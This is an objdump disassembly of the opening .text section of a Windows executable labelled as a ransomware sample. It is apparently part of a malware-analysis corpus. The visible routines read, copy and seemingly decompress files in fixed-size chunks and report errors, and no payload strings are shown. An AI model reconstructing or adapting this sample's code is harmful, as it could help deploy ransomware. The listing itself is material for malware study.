
malware_samples/ransomware/2bf72c8b782560f50f3eb889dc5df028d70f00b3ae09bce364dead4b59c74894.exe:     file format pei-x86-64


Disassembly of section .text:

0000000140001000 <.text>:
   140001000:	48 83 ec 28          	sub    $0x28,%rsp
   140001004:	e8 8f ee 00 00       	call   0x14000fe98
   140001009:	8b 08                	mov    (%rax),%ecx
   14000100b:	48 8b 05 86 bf 02 00 	mov    0x2bf86(%rip),%rax        # 0x14002cf98
   140001012:	89 08                	mov    %ecx,(%rax)
   140001014:	e8 87 ee 00 00       	call   0x14000fea0
   140001019:	48 8b 08             	mov    (%rax),%rcx
   14000101c:	48 8b 05 75 bf 02 00 	mov    0x2bf75(%rip),%rax        # 0x14002cf98
   140001023:	48 89 48 08          	mov    %rcx,0x8(%rax)
   140001027:	48 8b 0d 6a bf 02 00 	mov    0x2bf6a(%rip),%rcx        # 0x14002cf98
   14000102e:	48 83 c4 28          	add    $0x28,%rsp
   140001032:	e9 89 27 00 00       	jmp    0x1400037c0
   140001037:	cc                   	int3
   140001038:	cc                   	int3
   140001039:	cc                   	int3
   14000103a:	cc                   	int3
   14000103b:	cc                   	int3
   14000103c:	cc                   	int3
   14000103d:	cc                   	int3
   14000103e:	cc                   	int3
   14000103f:	cc                   	int3
   140001040:	48 8d 05 e9 32 04 00 	lea    0x432e9(%rip),%rax        # 0x140044330
   140001047:	c3                   	ret
   140001048:	cc                   	int3
   140001049:	cc                   	int3
   14000104a:	cc                   	int3
   14000104b:	cc                   	int3
   14000104c:	cc                   	int3
   14000104d:	cc                   	int3
   14000104e:	cc                   	int3
   14000104f:	cc                   	int3
   140001050:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140001055:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   14000105a:	4c 89 44 24 18       	mov    %r8,0x18(%rsp)
   14000105f:	57                   	push   %rdi
   140001060:	41 54                	push   %r12
   140001062:	41 55                	push   %r13
   140001064:	41 56                	push   %r14
   140001066:	41 57                	push   %r15
   140001068:	48 83 ec 30          	sub    $0x30,%rsp
   14000106c:	4c 8b f2             	mov    %rdx,%r14
   14000106f:	33 f6                	xor    %esi,%esi
   140001071:	48 8d 15 5c b8 02 00 	lea    0x2b85c(%rip),%rdx        # 0x14002c8d4
   140001078:	44 8b fe             	mov    %esi,%r15d
   14000107b:	49 8b f8             	mov    %r8,%rdi
   14000107e:	48 8b d9             	mov    %rcx,%rbx
   140001081:	41 bd ff ff ff ff    	mov    $0xffffffff,%r13d
   140001087:	e8 44 35 00 00       	call   0x1400045d0
   14000108c:	4c 8b e0             	mov    %rax,%r12
   14000108f:	48 85 c0             	test   %rax,%rax
   140001092:	75 15                	jne    0x1400010a9
   140001094:	49 8d 56 12          	lea    0x12(%r14),%rdx
   140001098:	48 8d 0d 39 b8 02 00 	lea    0x2b839(%rip),%rcx        # 0x14002c8d8
   14000109f:	e8 6c 16 00 00       	call   0x140002710
   1400010a4:	e9 21 01 00 00       	jmp    0x1400011ca
   1400010a9:	41 8b 56 04          	mov    0x4(%r14),%edx
   1400010ad:	45 33 c0             	xor    %r8d,%r8d
   1400010b0:	48 03 93 00 10 00 00 	add    0x1000(%rbx),%rdx
   1400010b7:	49 8b cc             	mov    %r12,%rcx
   1400010ba:	e8 b5 f6 00 00       	call   0x140010774
   1400010bf:	85 c0                	test   %eax,%eax
   1400010c1:	79 23                	jns    0x1400010e6
   1400010c3:	e8 fc 40 01 00       	call   0x1400151c4
   1400010c8:	4d 8d 4e 12          	lea    0x12(%r14),%r9
   1400010cc:	4c 8d 05 3d b8 02 00 	lea    0x2b83d(%rip),%r8        # 0x14002c910
   1400010d3:	48 8d 0d 72 b8 02 00 	lea    0x2b872(%rip),%rcx        # 0x14002c94c
   1400010da:	8b 10                	mov    (%rax),%edx
   1400010dc:	e8 2f 18 00 00       	call   0x140002910
   1400010e1:	e9 c6 00 00 00       	jmp    0x1400011ac
   1400010e6:	41 8b 4e 0c          	mov    0xc(%r14),%ecx
   1400010ea:	e8 21 41 01 00       	call   0x140015210
   1400010ef:	4c 8b f8             	mov    %rax,%r15
   1400010f2:	48 85 c0             	test   %rax,%rax
   1400010f5:	75 2b                	jne    0x140001122
   1400010f7:	41 8b 5e 0c          	mov    0xc(%r14),%ebx
   1400010fb:	e8 c4 40 01 00       	call   0x1400151c4
   140001100:	4d 8d 4e 12          	lea    0x12(%r14),%r9
   140001104:	89 5c 24 20          	mov    %ebx,0x20(%rsp)
   140001108:	4c 8d 05 51 b8 02 00 	lea    0x2b851(%rip),%r8        # 0x14002c960
   14000110f:	48 8d 0d 5e b6 02 00 	lea    0x2b65e(%rip),%rcx        # 0x14002c774
   140001116:	8b 10                	mov    (%rax),%edx
   140001118:	e8 f3 17 00 00       	call   0x140002910
   14000111d:	e9 8a 00 00 00       	jmp    0x1400011ac
   140001122:	41 80 7e 10 01       	cmpb   $0x1,0x10(%r14)
   140001127:	75 13                	jne    0x14000113c
   140001129:	4d 8b cf             	mov    %r15,%r9
   14000112c:	45 33 c0             	xor    %r8d,%r8d
   14000112f:	49 8b d6             	mov    %r14,%rdx
   140001132:	49 8b cc             	mov    %r12,%rcx
   140001135:	e8 d6 00 00 00       	call   0x140001210
   14000113a:	eb 61                	jmp    0x14000119d
   14000113c:	41 8b 5e 0c          	mov    0xc(%r14),%ebx
   140001140:	48 89 6c 24 60       	mov    %rbp,0x60(%rsp)
   140001145:	49 8b ef             	mov    %r15,%rbp
   140001148:	48 85 db             	test   %rbx,%rbx
   14000114b:	74 44                	je     0x140001191
   14000114d:	b8 00 20 00 00       	mov    $0x2000,%eax
   140001152:	0f 1f 40 00          	nopl   0x0(%rax)
   140001156:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000115d:	00 00 00 
   140001160:	48 3b d8             	cmp    %rax,%rbx
   140001163:	48 8b fb             	mov    %rbx,%rdi
   140001166:	4d 8b cc             	mov    %r12,%r9
   140001169:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   14000116f:	48 0f 47 f8          	cmova  %rax,%rdi
   140001173:	48 8b cd             	mov    %rbp,%rcx
   140001176:	48 8b d7             	mov    %rdi,%rdx
   140001179:	e8 aa f2 00 00       	call   0x140010428
   14000117e:	48 83 f8 01          	cmp    $0x1,%rax
   140001182:	72 69                	jb     0x1400011ed
   140001184:	48 03 ef             	add    %rdi,%rbp
   140001187:	b8 00 20 00 00       	mov    $0x2000,%eax
   14000118c:	48 2b df             	sub    %rdi,%rbx
   14000118f:	75 cf                	jne    0x140001160
   140001191:	8b c6                	mov    %esi,%eax
   140001193:	48 8b 7c 24 70       	mov    0x70(%rsp),%rdi
   140001198:	48 8b 6c 24 60       	mov    0x60(%rsp),%rbp
   14000119d:	85 c0                	test   %eax,%eax
   14000119f:	74 0b                	je     0x1400011ac
   1400011a1:	49 8b cf             	mov    %r15,%rcx
   1400011a4:	e8 57 40 01 00       	call   0x140015200
   1400011a9:	4c 8b fe             	mov    %rsi,%r15
   1400011ac:	49 8b cc             	mov    %r12,%rcx
   1400011af:	e8 18 ef 00 00       	call   0x1400100cc
   1400011b4:	49 8b f7             	mov    %r15,%rsi
   1400011b7:	4d 85 ff             	test   %r15,%r15
   1400011ba:	74 0e                	je     0x1400011ca
   1400011bc:	48 8b d7             	mov    %rdi,%rdx
   1400011bf:	49 8b cf             	mov    %r15,%rcx
   1400011c2:	e8 39 35 00 00       	call   0x140004700
   1400011c7:	44 8b e8             	mov    %eax,%r13d
   1400011ca:	48 8b ce             	mov    %rsi,%rcx
   1400011cd:	e8 2e 40 01 00       	call   0x140015200
   1400011d2:	48 8b 5c 24 68       	mov    0x68(%rsp),%rbx
   1400011d7:	41 8b c5             	mov    %r13d,%eax
   1400011da:	48 8b 74 24 78       	mov    0x78(%rsp),%rsi
   1400011df:	48 83 c4 30          	add    $0x30,%rsp
   1400011e3:	41 5f                	pop    %r15
   1400011e5:	41 5e                	pop    %r14
   1400011e7:	41 5d                	pop    %r13
   1400011e9:	41 5c                	pop    %r12
   1400011eb:	5f                   	pop    %rdi
   1400011ec:	c3                   	ret
   1400011ed:	e8 d2 3f 01 00       	call   0x1400151c4
   1400011f2:	4d 8d 4e 12          	lea    0x12(%r14),%r9
   1400011f6:	4c 8d 05 5b b6 02 00 	lea    0x2b65b(%rip),%r8        # 0x14002c858
   1400011fd:	48 8d 0d 88 b6 02 00 	lea    0x2b688(%rip),%rcx        # 0x14002c88c
   140001204:	8b 10                	mov    (%rax),%edx
   140001206:	e8 05 17 00 00       	call   0x140002910
   14000120b:	41 8b c5             	mov    %r13d,%eax
   14000120e:	eb 83                	jmp    0x140001193
   140001210:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   140001215:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   14000121a:	53                   	push   %rbx
   14000121b:	55                   	push   %rbp
   14000121c:	56                   	push   %rsi
   14000121d:	57                   	push   %rdi
   14000121e:	41 56                	push   %r14
   140001220:	41 57                	push   %r15
   140001222:	48 81 ec 88 00 00 00 	sub    $0x88,%rsp
   140001229:	33 c0                	xor    %eax,%eax
   14000122b:	4d 8b f0             	mov    %r8,%r14
   14000122e:	48 8b da             	mov    %rdx,%rbx
   140001231:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   140001236:	48 8b f9             	mov    %rcx,%rdi
   140001239:	48 89 44 24 58       	mov    %rax,0x58(%rsp)
   14000123e:	41 b8 58 00 00 00    	mov    $0x58,%r8d
   140001244:	48 89 44 24 60       	mov    %rax,0x60(%rsp)
   140001249:	48 8d 15 80 b4 02 00 	lea    0x2b480(%rip),%rdx        # 0x14002c6d0
   140001250:	89 44 24 28          	mov    %eax,0x28(%rsp)
   140001254:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140001259:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000125e:	8b e8                	mov    %eax,%ebp
   140001260:	49 8b f1             	mov    %r9,%rsi
   140001263:	e8 98 ab 00 00       	call   0x14000be00
   140001268:	44 8b f8             	mov    %eax,%r15d
   14000126b:	85 c0                	test   %eax,%eax
   14000126d:	74 28                	je     0x140001297
   14000126f:	48 8d 53 12          	lea    0x12(%rbx),%rdx
   140001273:	44 8b c0             	mov    %eax,%r8d
   140001276:	48 8d 0d 63 b4 02 00 	lea    0x2b463(%rip),%rcx        # 0x14002c6e0
   14000127d:	e8 8e 14 00 00       	call   0x140002710
   140001282:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   140001287:	48 81 c4 88 00 00 00 	add    $0x88,%rsp
   14000128e:	41 5f                	pop    %r15
   140001290:	41 5e                	pop    %r14
   140001292:	5f                   	pop    %rdi
   140001293:	5e                   	pop    %rsi
   140001294:	5d                   	pop    %rbp
   140001295:	5b                   	pop    %rbx
   140001296:	c3                   	ret
   140001297:	b9 00 20 00 00       	mov    $0x2000,%ecx
   14000129c:	4c 89 ac 24 80 00 00 	mov    %r13,0x80(%rsp)
   1400012a3:	00 
   1400012a4:	e8 67 3f 01 00       	call   0x140015210
   1400012a9:	4c 8b e8             	mov    %rax,%r13
   1400012ac:	48 85 c0             	test   %rax,%rax
   1400012af:	75 23                	jne    0x1400012d4
   1400012b1:	e8 0e 3f 01 00       	call   0x1400151c4
   1400012b6:	4c 8d 4b 12          	lea    0x12(%rbx),%r9
   1400012ba:	4c 8d 05 6f b4 02 00 	lea    0x2b46f(%rip),%r8        # 0x14002c730
   1400012c1:	48 8d 0d ac b4 02 00 	lea    0x2b4ac(%rip),%rcx        # 0x14002c774
   1400012c8:	8b 10                	mov    (%rax),%edx
   1400012ca:	e8 41 16 00 00       	call   0x140002910
   1400012cf:	e9 65 01 00 00       	jmp    0x140001439
   1400012d4:	b9 00 20 00 00       	mov    $0x2000,%ecx
   1400012d9:	e8 32 3f 01 00       	call   0x140015210
   1400012de:	48 8b e8             	mov    %rax,%rbp
   1400012e1:	48 85 c0             	test   %rax,%rax
   1400012e4:	75 23                	jne    0x140001309
   1400012e6:	e8 d9 3e 01 00       	call   0x1400151c4
   1400012eb:	4c 8d 4b 12          	lea    0x12(%rbx),%r9
   1400012ef:	4c 8d 05 8a b4 02 00 	lea    0x2b48a(%rip),%r8        # 0x14002c780
   1400012f6:	48 8d 0d 77 b4 02 00 	lea    0x2b477(%rip),%rcx        # 0x14002c774
   1400012fd:	8b 10                	mov    (%rax),%edx
   1400012ff:	e8 0c 16 00 00       	call   0x140002910
   140001304:	e9 30 01 00 00       	jmp    0x140001439
   140001309:	4c 89 a4 24 d0 00 00 	mov    %r12,0xd0(%rsp)
   140001310:	00 
   140001311:	41 bf ff ff ff ff    	mov    $0xffffffff,%r15d
   140001317:	44 8b 63 08          	mov    0x8(%rbx),%r12d
   14000131b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140001320:	b8 00 20 00 00       	mov    $0x2000,%eax
   140001325:	49 8b dc             	mov    %r12,%rbx
   140001328:	4c 3b e0             	cmp    %rax,%r12
   14000132b:	4c 8b cf             	mov    %rdi,%r9
   14000132e:	ba 01 00 00 00       	mov    $0x1,%edx
   140001333:	49 8b cd             	mov    %r13,%rcx
   140001336:	48 0f 47 d8          	cmova  %rax,%rbx
   14000133a:	4c 8b c3             	mov    %rbx,%r8
   14000133d:	e8 e6 f0 00 00       	call   0x140010428
   140001342:	48 3b c3             	cmp    %rbx,%rax
   140001345:	0f 85 e6 00 00 00    	jne    0x140001431
   14000134b:	48 8b cf             	mov    %rdi,%rcx
   14000134e:	e8 3d ee 00 00       	call   0x140010190
   140001353:	85 c0                	test   %eax,%eax
   140001355:	0f 85 d6 00 00 00    	jne    0x140001431
   14000135b:	4c 2b e3             	sub    %rbx,%r12
   14000135e:	89 5c 24 28          	mov    %ebx,0x28(%rsp)
   140001362:	4c 89 6c 24 20       	mov    %r13,0x20(%rsp)
   140001367:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   14000136e:	00 00 
   140001370:	bb 00 20 00 00       	mov    $0x2000,%ebx
   140001375:	48 89 6c 24 30       	mov    %rbp,0x30(%rsp)
   14000137a:	33 d2                	xor    %edx,%edx
   14000137c:	89 5c 24 38          	mov    %ebx,0x38(%rsp)
   140001380:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140001385:	e8 b6 8e 00 00       	call   0x14000a240
   14000138a:	8b f8                	mov    %eax,%edi
   14000138c:	41 bf ff ff ff ff    	mov    $0xffffffff,%r15d
   140001392:	8d 48 04             	lea    0x4(%rax),%ecx
   140001395:	83 f9 02             	cmp    $0x2,%ecx
   140001398:	76 7c                	jbe    0x140001416
   14000139a:	83 f8 02             	cmp    $0x2,%eax
   14000139d:	74 72                	je     0x140001411
   14000139f:	8b 4c 24 38          	mov    0x38(%rsp),%ecx
   1400013a3:	48 2b d9             	sub    %rcx,%rbx
   1400013a6:	4d 85 f6             	test   %r14,%r14
   1400013a9:	74 29                	je     0x1400013d4
   1400013ab:	4d 8b ce             	mov    %r14,%r9
   1400013ae:	4c 8b c3             	mov    %rbx,%r8
   1400013b1:	ba 01 00 00 00       	mov    $0x1,%edx
   1400013b6:	48 8b cd             	mov    %rbp,%rcx
   1400013b9:	e8 be f7 00 00       	call   0x140010b7c
   1400013be:	48 3b c3             	cmp    %rbx,%rax
   1400013c1:	75 0c                	jne    0x1400013cf
   1400013c3:	49 8b ce             	mov    %r14,%rcx
   1400013c6:	e8 c5 ed 00 00       	call   0x140010190
   1400013cb:	85 c0                	test   %eax,%eax
   1400013cd:	74 1b                	je     0x1400013ea
   1400013cf:	41 8b ff             	mov    %r15d,%edi
   1400013d2:	eb 42                	jmp    0x140001416
   1400013d4:	48 85 f6             	test   %rsi,%rsi
   1400013d7:	74 11                	je     0x1400013ea
   1400013d9:	4c 8b c3             	mov    %rbx,%r8
   1400013dc:	48 8b d5             	mov    %rbp,%rdx
   1400013df:	48 8b ce             	mov    %rsi,%rcx
   1400013e2:	e8 19 8d 02 00       	call   0x14002a100
   1400013e7:	48 03 f3             	add    %rbx,%rsi
   1400013ea:	83 7c 24 38 00       	cmpl   $0x0,0x38(%rsp)
   1400013ef:	0f 84 7b ff ff ff    	je     0x140001370
   1400013f5:	83 ff 01             	cmp    $0x1,%edi
   1400013f8:	74 12                	je     0x14000140c
   1400013fa:	4d 85 e4             	test   %r12,%r12
   1400013fd:	74 17                	je     0x140001416
   1400013ff:	48 8b bc 24 c0 00 00 	mov    0xc0(%rsp),%rdi
   140001406:	00 
   140001407:	e9 14 ff ff ff       	jmp    0x140001320
   14000140c:	45 33 ff             	xor    %r15d,%r15d
   14000140f:	eb 20                	jmp    0x140001431
   140001411:	bf fd ff ff ff       	mov    $0xfffffffd,%edi
   140001416:	48 8b 94 24 c8 00 00 	mov    0xc8(%rsp),%rdx
   14000141d:	00 
   14000141e:	48 8d 0d ab b3 02 00 	lea    0x2b3ab(%rip),%rcx        # 0x14002c7d0
   140001425:	48 83 c2 12          	add    $0x12,%rdx
   140001429:	44 8b c7             	mov    %edi,%r8d
   14000142c:	e8 df 12 00 00       	call   0x140002710
   140001431:	4c 8b a4 24 d0 00 00 	mov    0xd0(%rsp),%r12
   140001438:	00 
   140001439:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   14000143e:	e8 9d a6 00 00       	call   0x14000bae0
   140001443:	49 8b cd             	mov    %r13,%rcx
   140001446:	e8 b5 3d 01 00       	call   0x140015200
   14000144b:	48 8b cd             	mov    %rbp,%rcx
   14000144e:	e8 ad 3d 01 00       	call   0x140015200
   140001453:	4c 8b ac 24 80 00 00 	mov    0x80(%rsp),%r13
   14000145a:	00 
   14000145b:	41 8b c7             	mov    %r15d,%eax
   14000145e:	48 81 c4 88 00 00 00 	add    $0x88,%rsp
   140001465:	41 5f                	pop    %r15
   140001467:	41 5e                	pop    %r14
   140001469:	5f                   	pop    %rdi
   14000146a:	5e                   	pop    %rsi
   14000146b:	5d                   	pop    %rbp
   14000146c:	5b                   	pop    %rbx
   14000146d:	c3                   	ret
   14000146e:	cc                   	int3
   14000146f:	cc                   	int3
   140001470:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   140001475:	55                   	push   %rbp
   140001476:	41 56                	push   %r14
   140001478:	41 57                	push   %r15
   14000147a:	48 83 ec 30          	sub    $0x30,%rsp
   14000147e:	48 8b ea             	mov    %rdx,%rbp
   140001481:	48 8b d9             	mov    %rcx,%rbx
   140001484:	48 8d 15 49 b4 02 00 	lea    0x2b449(%rip),%rdx        # 0x14002c8d4
   14000148b:	45 33 f6             	xor    %r14d,%r14d
   14000148e:	e8 3d 31 00 00       	call   0x1400045d0
   140001493:	4c 8b f8             	mov    %rax,%r15
   140001496:	48 85 c0             	test   %rax,%rax
   140001499:	75 21                	jne    0x1400014bc
   14000149b:	48 8d 55 12          	lea    0x12(%rbp),%rdx
   14000149f:	48 8d 0d 32 b4 02 00 	lea    0x2b432(%rip),%rcx        # 0x14002c8d8
   1400014a6:	e8 65 12 00 00       	call   0x140002710
   1400014ab:	33 c0                	xor    %eax,%eax
   1400014ad:	48 8b 5c 24 68       	mov    0x68(%rsp),%rbx
   1400014b2:	48 83 c4 30          	add    $0x30,%rsp
   1400014b6:	41 5f                	pop    %r15
   1400014b8:	41 5e                	pop    %r14
   1400014ba:	5d                   	pop    %rbp
   1400014bb:	c3                   	ret
   1400014bc:	8b 55 04             	mov    0x4(%rbp),%edx
   1400014bf:	45 33 c0             	xor    %r8d,%r8d
   1400014c2:	48 03 93 00 10 00 00 	add    0x1000(%rbx),%rdx
   1400014c9:	49 8b cf             	mov    %r15,%rcx
   1400014cc:	e8 a3 f2 00 00       	call   0x140010774
   1400014d1:	85 c0                	test   %eax,%eax
   1400014d3:	79 23                	jns    0x1400014f8
   1400014d5:	e8 ea 3c 01 00       	call   0x1400151c4
   1400014da:	4c 8d 4d 12          	lea    0x12(%rbp),%r9
   1400014de:	4c 8d 05 2b b4 02 00 	lea    0x2b42b(%rip),%r8        # 0x14002c910
   1400014e5:	48 8d 0d 60 b4 02 00 	lea    0x2b460(%rip),%rcx        # 0x14002c94c
   1400014ec:	8b 10                	mov    (%rax),%edx
   1400014ee:	e8 1d 14 00 00       	call   0x140002910
   1400014f3:	e9 c4 00 00 00       	jmp    0x1400015bc
   1400014f8:	8b 4d 0c             	mov    0xc(%rbp),%ecx
   1400014fb:	e8 10 3d 01 00       	call   0x140015210
   140001500:	4c 8b f0             	mov    %rax,%r14
   140001503:	48 85 c0             	test   %rax,%rax
   140001506:	75 2a                	jne    0x140001532
   140001508:	8b 5d 0c             	mov    0xc(%rbp),%ebx
   14000150b:	e8 b4 3c 01 00       	call   0x1400151c4
   140001510:	4c 8d 4d 12          	lea    0x12(%rbp),%r9
   140001514:	89 5c 24 20          	mov    %ebx,0x20(%rsp)
   140001518:	4c 8d 05 41 b4 02 00 	lea    0x2b441(%rip),%r8        # 0x14002c960
   14000151f:	48 8d 0d 4e b2 02 00 	lea    0x2b24e(%rip),%rcx        # 0x14002c774
   140001526:	8b 10                	mov    (%rax),%edx
   140001528:	e8 e3 13 00 00       	call   0x140002910
   14000152d:	e9 8a 00 00 00       	jmp    0x1400015bc
   140001532:	80 7d 10 01          	cmpb   $0x1,0x10(%rbp)
   140001536:	75 13                	jne    0x14000154b
   140001538:	4d 8b ce             	mov    %r14,%r9
   14000153b:	45 33 c0             	xor    %r8d,%r8d
   14000153e:	48 8b d5             	mov    %rbp,%rdx
   140001541:	49 8b cf             	mov    %r15,%rcx
   140001544:	e8 c7 fc ff ff       	call   0x140001210
   140001549:	eb 62                	jmp    0x1400015ad
   14000154b:	8b 5d 0c             	mov    0xc(%rbp),%ebx
   14000154e:	48 89 74 24 50       	mov    %rsi,0x50(%rsp)
   140001553:	49 8b f6             	mov    %r14,%rsi
   140001556:	48 89 7c 24 58       	mov    %rdi,0x58(%rsp)
   14000155b:	4c 89 64 24 60       	mov    %r12,0x60(%rsp)
   140001560:	48 85 db             	test   %rbx,%rbx
   140001563:	74 37                	je     0x14000159c
   140001565:	41 bc 00 20 00 00    	mov    $0x2000,%r12d
   14000156b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140001570:	49 3b dc             	cmp    %r12,%rbx
   140001573:	48 8b fb             	mov    %rbx,%rdi
   140001576:	4d 8b cf             	mov    %r15,%r9
   140001579:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   14000157f:	49 0f 47 fc          	cmova  %r12,%rdi
   140001583:	48 8b ce             	mov    %rsi,%rcx
   140001586:	48 8b d7             	mov    %rdi,%rdx
   140001589:	e8 9a ee 00 00       	call   0x140010428
   14000158e:	48 83 f8 01          	cmp    $0x1,%rax
   140001592:	72 42                	jb     0x1400015d6
   140001594:	48 03 f7             	add    %rdi,%rsi
   140001597:	48 2b df             	sub    %rdi,%rbx
   14000159a:	75 d4                	jne    0x140001570
   14000159c:	33 c0                	xor    %eax,%eax
   14000159e:	48 8b 7c 24 58       	mov    0x58(%rsp),%rdi
   1400015a3:	48 8b 74 24 50       	mov    0x50(%rsp),%rsi
   1400015a8:	4c 8b 64 24 60       	mov    0x60(%rsp),%r12
   1400015ad:	85 c0                	test   %eax,%eax
   1400015af:	74 0b                	je     0x1400015bc
   1400015b1:	49 8b ce             	mov    %r14,%rcx
   1400015b4:	e8 47 3c 01 00       	call   0x140015200
   1400015b9:	45 33 f6             	xor    %r14d,%r14d
   1400015bc:	49 8b cf             	mov    %r15,%rcx
   1400015bf:	e8 08 eb 00 00       	call   0x1400100cc
   1400015c4:	48 8b 5c 24 68       	mov    0x68(%rsp),%rbx
   1400015c9:	49 8b c6             	mov    %r14,%rax
   1400015cc:	48 83 c4 30          	add    $0x30,%rsp
   1400015d0:	41 5f                	pop    %r15
   1400015d2:	41 5e                	pop    %r14
   1400015d4:	5d                   	pop    %rbp
   1400015d5:	c3                   	ret
   1400015d6:	e8 e9 3b 01 00       	call   0x1400151c4
   1400015db:	4c 8d 4d 12          	lea    0x12(%rbp),%r9
   1400015df:	4c 8d 05 72 b2 02 00 	lea    0x2b272(%rip),%r8        # 0x14002c858
   1400015e6:	48 8d 0d 9f b2 02 00 	lea    0x2b29f(%rip),%rcx        # 0x14002c88c
   1400015ed:	8b 10                	mov    (%rax),%edx
   1400015ef:	e8 1c 13 00 00       	call   0x140002910
   1400015f4:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   1400015f9:	eb a3                	jmp    0x14000159e
   1400015fb:	cc                   	int3
   1400015fc:	cc                   	int3
   1400015fd:	cc                   	int3
   1400015fe:	cc                   	int3
   1400015ff:	cc                   	int3
   140001600:	40 53                	rex push %rbx
   140001602:	57                   	push   %rdi
   140001603:	48 83 ec 38          	sub    $0x38,%rsp
   140001607:	80 7a 11 6e          	cmpb   $0x6e,0x11(%rdx)
   14000160b:	48 8b fa             	mov    %rdx,%rdi
   14000160e:	48 8b d9             	mov    %rcx,%rbx
   140001611:	75 24                	jne    0x140001637
   140001613:	e8 38 fa ff ff       	call   0x140001050
   140001618:	8b d8                	mov    %eax,%ebx
   14000161a:	85 c0                	test   %eax,%eax
   14000161c:	79 10                	jns    0x14000162e
   14000161e:	48 8d 57 12          	lea    0x12(%rdi),%rdx
   140001622:	48 8d 0d 7f b3 02 00 	lea    0x2b37f(%rip),%rcx        # 0x14002c9a8
   140001629:	e8 e2 10 00 00       	call   0x140002710
   14000162e:	8b c3                	mov    %ebx,%eax
   140001630:	48 83 c4 38          	add    $0x38,%rsp
   140001634:	5f                   	pop    %rdi
   140001635:	5b                   	pop    %rbx
   140001636:	c3                   	ret
   140001637:	48 8d 15 8e b3 02 00 	lea    0x2b38e(%rip),%rdx        # 0x14002c9cc
   14000163e:	4c 89 64 24 60       	mov    %r12,0x60(%rsp)
   140001643:	49 8b c8             	mov    %r8,%rcx
   140001646:	e8 85 2f 00 00       	call   0x1400045d0
   14000164b:	4c 8b e0             	mov    %rax,%r12
   14000164e:	48 85 c0             	test   %rax,%rax
   140001651:	75 2f                	jne    0x140001682
   140001653:	e8 6c 3b 01 00       	call   0x1400151c4
   140001658:	4c 8d 4f 12          	lea    0x12(%rdi),%r9
   14000165c:	4c 8d 05 6d b3 02 00 	lea    0x2b36d(%rip),%r8        # 0x14002c9d0
   140001663:	48 8d 0d 9a b3 02 00 	lea    0x2b39a(%rip),%rcx        # 0x14002ca04
   14000166a:	8b 10                	mov    (%rax),%edx
   14000166c:	e8 9f 12 00 00       	call   0x140002910
   140001671:	4c 8b 64 24 60       	mov    0x60(%rsp),%r12
   140001676:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   14000167b:	48 83 c4 38          	add    $0x38,%rsp
   14000167f:	5f                   	pop    %rdi
   140001680:	5b                   	pop    %rbx
   140001681:	c3                   	ret
   140001682:	48 8d 15 4b b2 02 00 	lea    0x2b24b(%rip),%rdx        # 0x14002c8d4
   140001689:	4c 89 7c 24 20       	mov    %r15,0x20(%rsp)
   14000168e:	48 8b cb             	mov    %rbx,%rcx
   140001691:	e8 3a 2f 00 00       	call   0x1400045d0
   140001696:	4c 8b f8             	mov    %rax,%r15
   140001699:	48 85 c0             	test   %rax,%rax
   14000169c:	75 1a                	jne    0x1400016b8
   14000169e:	48 8d 57 12          	lea    0x12(%rdi),%rdx
   1400016a2:	48 8d 0d 2f b2 02 00 	lea    0x2b22f(%rip),%rcx        # 0x14002c8d8
   1400016a9:	e8 62 10 00 00       	call   0x140002710
   1400016ae:	bb ff ff ff ff       	mov    $0xffffffff,%ebx
   1400016b3:	e9 69 01 00 00       	jmp    0x140001821
   1400016b8:	8b 57 04             	mov    0x4(%rdi),%edx
   1400016bb:	45 33 c0             	xor    %r8d,%r8d
   1400016be:	48 03 93 00 10 00 00 	add    0x1000(%rbx),%rdx
   1400016c5:	49 8b cf             	mov    %r15,%rcx
   1400016c8:	e8 a7 f0 00 00       	call   0x140010774
   1400016cd:	85 c0                	test   %eax,%eax
   1400016cf:	79 28                	jns    0x1400016f9
   1400016d1:	e8 ee 3a 01 00       	call   0x1400151c4
   1400016d6:	4c 8d 4f 12          	lea    0x12(%rdi),%r9
   1400016da:	4c 8d 05 2f b2 02 00 	lea    0x2b22f(%rip),%r8        # 0x14002c910
   1400016e1:	48 8d 0d 64 b2 02 00 	lea    0x2b264(%rip),%rcx        # 0x14002c94c
   1400016e8:	8b 10                	mov    (%rax),%edx
   1400016ea:	e8 21 12 00 00       	call   0x140002910
   1400016ef:	bb ff ff ff ff       	mov    $0xffffffff,%ebx
   1400016f4:	e9 20 01 00 00       	jmp    0x140001819
   1400016f9:	80 7f 10 01          	cmpb   $0x1,0x10(%rdi)
   1400016fd:	75 18                	jne    0x140001717
   1400016ff:	45 33 c9             	xor    %r9d,%r9d
   140001702:	4d 8b c4             	mov    %r12,%r8
   140001705:	48 8b d7             	mov    %rdi,%rdx
   140001708:	49 8b cf             	mov    %r15,%rcx
   14000170b:	e8 00 fb ff ff       	call   0x140001210
   140001710:	8b d8                	mov    %eax,%ebx
   140001712:	e9 02 01 00 00       	jmp    0x140001819
   140001717:	4c 89 6c 24 30       	mov    %r13,0x30(%rsp)
   14000171c:	33 db                	xor    %ebx,%ebx
   14000171e:	41 bd 00 20 00 00    	mov    $0x2000,%r13d
   140001724:	4c 89 74 24 28       	mov    %r14,0x28(%rsp)
   140001729:	41 8b cd             	mov    %r13d,%ecx
   14000172c:	e8 df 3a 01 00       	call   0x140015210
   140001731:	4c 8b f0             	mov    %rax,%r14
   140001734:	48 85 c0             	test   %rax,%rax
   140001737:	75 28                	jne    0x140001761
   140001739:	e8 86 3a 01 00       	call   0x1400151c4
   14000173e:	4c 8d 4f 12          	lea    0x12(%rdi),%r9
   140001742:	4c 8d 05 cf b0 02 00 	lea    0x2b0cf(%rip),%r8        # 0x14002c818
